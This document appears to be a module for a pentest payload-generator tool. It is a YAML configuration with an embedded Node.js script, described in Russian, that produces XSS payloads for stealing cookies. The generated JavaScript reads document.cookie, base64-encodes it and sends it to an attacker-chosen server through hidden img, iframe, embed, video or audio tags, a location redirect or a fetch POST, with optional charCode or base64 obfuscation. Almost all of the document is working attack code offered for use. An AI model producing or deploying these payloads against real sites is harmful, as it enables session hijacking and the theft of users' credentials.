description: >-
  Генератор нагрузки для похищения печенья. Внедрять вместо alert(0).
author: vinzekatze
tags:
  - xss
  - payload
  - generator
  - cookie

arguments:
  url:
    default:
    description: >-
      URL отслеживающего сервера (например: 'http://pentester.site')
  a:
    default:
      - img
      - iframe
      - embed
      - video
      - audio
      - location
      - fetch
    description: агент с помощью которого будет осуществляться запрос на отслеживающий сервер
    replacer: '#agent#'
  c:
    default: '.*'
    description: указать имена конкретных cookie для похищения
    multiple: true
    metavar: COOKIE
  e:
    default:
      - charcode
      - base64
      - none
    description: способ кодирования строк в нагрузке
    replacer: '#e#'
  quot:
    default:
      - apos
      - quot
      - grave
    description: тип кавычек, используемых для строк в JS
    replacer: '#quot#'
  param:
    default: payload
    description: Параметр, в котором будет отправляться похищенное в кодировке base64
    metavar: PARAMETER
  head:
    default: 
      - body
      - head
    description: вставлять нагрузку в document.head вместо document.body (не применимо к location)
    replacer: '#pos#'


mode:
  format:
    url: '{0!r}'
    param: '{0!r}'
    head: '{0!r}'
    e: '{0!r}'
    quot: '{0!r}'
  join:
    c: '|'
  pformat:
    c: '{0!r}'

  replace:
    quot:
      apos: "'"
      quot: '"'
      grave: '`'
    a:
      img: |-
        var strings = {
          elem1: `<img src="${serverURL}?${serverParam}=`,
          elem2: `" style="display:none">`
        };
        var payloadTemplate = "document.${position}.insertAdjacentHTML(${ENC.position},${ENC.elem1}.concat(${cookiesnatch},${ENC.elem2}))";
      iframe: |-
        var strings = {
          elem1: `<iframe src="${serverURL}?${serverParam}=`,
          elem2: `" style="display:none"></iframe>`
        };
        var payloadTemplate = "document.${position}.insertAdjacentHTML(${ENC.position},${ENC.elem1}.concat(${cookiesnatch},${ENC.elem2}))";
      embed: |-
        var strings = {
          elem1: `<embed src="${serverURL}?${serverParam}=`,
          elem2: `" style="display:none">`
        };
        var payloadTemplate = "document.${position}.insertAdjacentHTML(${ENC.position},${ENC.elem1}.concat(${cookiesnatch},${ENC.elem2}))";
      video: |-
        var strings = {
          elem1: `<video src="${serverURL}?${serverParam}=`,
          elem2: `"controls style="display:none"></video>`
        };
        var payloadTemplate = "document.${position}.insertAdjacentHTML(${ENC.position},${ENC.elem1}.concat(${cookiesnatch},${ENC.elem2}))";
      audio: |-
        var strings = {
          elem1: `<audio src="${serverURL}?${serverParam}=`,
          elem2: `"controls style="display:none"></audio>`
        };
        var payloadTemplate = "document.${position}.insertAdjacentHTML(${ENC.position},${ENC.elem1}.concat(${cookiesnatch},${ENC.elem2}))";
      location: |
        var strings = {
          elem1: `${serverURL}?${serverParam}=`
        };
        var payloadTemplate = "window.location.replace(${ENC.elem1}.concat(${cookiesnatch}))";
      fetch: |
        var strings = {
          elem1: `${serverURL}`,
          fetch1: `{"method":"POST","mode":"no-cors","body":"${serverParam}=`,
          fetch2: '"}'
        };
        var payloadTemplate = "fetch(${ENC.elem1},JSON.parse(${ENC.fetch1}.concat(${cookiesnatch},${ENC.fetch2})))";
shell: node
script: |
  function MakeCharCode(pld) {
    let output_arr = [];
    let pld_arr = [...pld];
    pld_arr.forEach((i) => {
      output_arr.push(i.charCodeAt(0));
    });
    output = output_arr.join(",");
    return output;
  };

  function EncodePld(entype, pld) {
    let output = {};
    for (let key in pld) {
      let code = '';
      switch (entype) {
      case "charcode":
        code = MakeCharCode(pld[key]);
        output[key] = `String.fromCharCode(${code})`;
        break;
      case "base64":
        code = btoa(pld[key]);
        output[key] = `atob(${quot}${code}${quot})`;
        break;
      case "none":
        code = pld[key].replace(/[\'\"\`]/g, '\\$&');
        code = code.replace(/\n/g, "\\n");
        code = code.replace(/\t/g, "\\t");
        output[key] = `${quot}${code}${quot}`
      };
    };
    return output;
  };	
  
  var quot = #quot#;
  var serverURL = #url#;
  var serverParam = #param#;
  var input_cookieRegex = #c#;
  var position = #pos#;

  // Кодируемые элементы
  const bsc_strings = {
    position: "beforeend",
    g: "g",
    delim: "; ",
    cookieRegex: `(${input_cookieRegex})=[^;]+`
  };

  #agent#
  
  // Сборка нагрузки
  all_strings = {...strings, ...bsc_strings};
  ENC = EncodePld(#e#, all_strings);
  cookiesnatch = `btoa(document.cookie.match(RegExp(${ENC.cookieRegex},${ENC.g})).join(${ENC.delim}))`;
  payload = eval(`\`${payloadTemplate}\``);

  console.log(payload);